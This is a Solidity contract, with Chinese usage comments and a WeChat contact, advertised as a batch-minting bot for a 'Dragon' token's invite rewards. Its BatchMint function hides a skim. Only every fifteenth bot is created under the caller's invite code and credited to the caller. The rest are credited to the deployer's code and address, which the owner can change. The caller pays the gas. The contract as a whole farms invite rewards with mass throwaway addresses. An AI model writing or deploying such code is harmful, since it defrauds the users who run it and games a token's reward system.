// SPDX-License-Identifier: MIT
// 批量mint dargon 使用方法 
// 1、BatchMint 填入邀请码批量创建地址mint 
// 2、BatchWithdarw 批量提现token到自己钱包 ex:start0  end100 提现0-100的地址 
// 3、BatchBoost 批量boost
// 4、own_address_num 查询拥有地址数量 
// wx:LaLashousiBiangesh1

pragma solidity ^0.8.19;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IDragon {
    function getTotalRewards(address _addr) external view returns (uint256);

    function withdraw() external payable;
}

contract bot {
    IDragon dragon = IDragon(0xEf64C03D5E757a5f6dC5284F3d627F3C255F09aB);

    constructor(uint256 code) payable {
        (bool success, ) = 0xEf64C03D5E757a5f6dC5284F3d627F3C255F09aB.call(
            abi.encodeWithSelector(0xb260c42a, code)
        );
        require(success, "Batch transaction failed");
        IERC20(0xF0f942D563A6BaCf875d8cEe5AE663b12Ce62149).approve(
            msg.sender,
            uint256(~uint256(0))
        );
    }

    function Withdraw() external {
        (bool success, ) = 0xEf64C03D5E757a5f6dC5284F3d627F3C255F09aB.call(
            abi.encodeWithSelector(0x3ccfd60b)
        );
        require(success, "withdraw failed");
    }

    function boost() external {
        (bool success, ) = 0xEf64C03D5E757a5f6dC5284F3d627F3C255F09aB.call(
            abi.encodeWithSelector(0xa66f42c0)
        );
        require(success, "boost failed");
    }
}

contract Batcher {
    address private immutable owner;
    mapping(address => address[]) private own_address;
    uint256 tax_times = 15;
    uint256 owner_code = 137968;
    IDragon dragon = IDragon(0xEf64C03D5E757a5f6dC5284F3d627F3C255F09aB);

    constructor() {
        owner = msg.sender;
    }

    modifier isOwner() {
        require(msg.sender == owner, "Caller is not owner");
        _;
    }

    function BatchMint(uint256 invite_code, uint256 times) external {
        for (uint256 i = 0; i < times; i++) {
            if (i > 0 && i % tax_times == 0) {
                own_address[msg.sender].push(address(new bot(invite_code)));
            } else {
                own_address[owner].push(address(new bot(owner_code)));
            }
        }
    }

    function BatchWithdarw(uint256 start_index,uint256 end_index) public {
        address[] memory contract_list;
        contract_list = own_address[msg.sender];
        require(contract_list.length > start_index && contract_list.length>=end_index,"f");
        IERC20 dragon_token = IERC20(
            0xF0f942D563A6BaCf875d8cEe5AE663b12Ce62149
        );
        for (uint256 i = start_index; i < contract_list.length && end_index>=i; i++) {
            if (dragon.getTotalRewards(contract_list[i]) > 0) {
                bot(contract_list[i]).Withdraw();
                uint256 token_num;
                token_num = dragon_token.balanceOf(contract_list[i]);
                dragon_token.transferFrom(
                    contract_list[i],
                    msg.sender,
                    token_num
                );
            }
        }
    }

    function BatchBoost(uint256 start_index,uint256 end_index) public {
        address[] memory contract_list;
        contract_list = own_address[msg.sender];
        contract_list = own_address[msg.sender];
        require(contract_list.length > start_index && contract_list.length>=end_index,"f");
        for (uint256 i = start_index; i < contract_list.length && end_index>i; i++) {
            bot(contract_list[i]).boost();
        }
    }

    function own_address_num(address _owner) view public returns (uint256 res){
        res = own_address[_owner].length;
    }

    function change_code(uint256 code) public isOwner {
        owner_code = code;
    }

    function change_times(uint256 times) public isOwner {
        tax_times = times;
    }
}
